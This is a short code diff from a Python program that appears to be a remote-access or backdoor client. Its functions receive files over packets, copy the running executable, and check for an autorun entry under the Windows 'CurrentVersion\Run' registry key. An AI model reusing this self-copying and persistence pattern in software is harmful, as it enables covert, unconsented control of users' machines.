@@ -158,19 +158,6 @@ def file_recv(packet):
     finally:
         file.close()
 
-# def is_writable(folder_name):
-#     try:
-#         print(folder_name)
-#         t_file_name = str(random.randint(1,1))
-
-#         with open(folder_name + "\\" + t_file_name, 'wb') as f:
-#             f.write(b' ')
-#         os.remove(t_file_name)
-#         print(folder_name)
-#         return True
-#     except Exception as e:
-#         return False
-
 def copy_transfer():
     file_path = os.getcwd()
     file_name = os.path.basename(sys.argv[0])
@@ -184,19 +171,20 @@ def copy_transfer():
     except:
         return False
 
-def check_key(key_path = os.path.dirname(os.getenv('APPDATA')) +"\\Local\\{}".format(SERVICE_NAME)):
-    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", access=winreg.KEY_READ)
-    try:
-        count = 0
-        while(True):
-            val, path, data_type = winreg.EnumValue(key, count)
-            if val == SERVICE_NAME:
-                return True
-            count += 1
-    except:
-        return False
-    finally:
-        winreg.CloseKey(key)
+if os.name == 'nt':
+    def check_key(key_path = os.path.dirname(os.getenv('APPDATA')) +"\\Local\\{}".format(SERVICE_NAME)):
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", access=winreg.KEY_READ)
+        try:
+            count = 0
+            while(True):
+                val, path, data_type = winreg.EnumValue(key, count)
+                if val == SERVICE_NAME:
+                    return True
+                count += 1
+        except:
+            return False
+        finally:
+            winreg.CloseKey(key)
 
     # file_path = os.getcwd()
     # abs_path = "C:\\Users" #"C:\\Program Files (x86)"
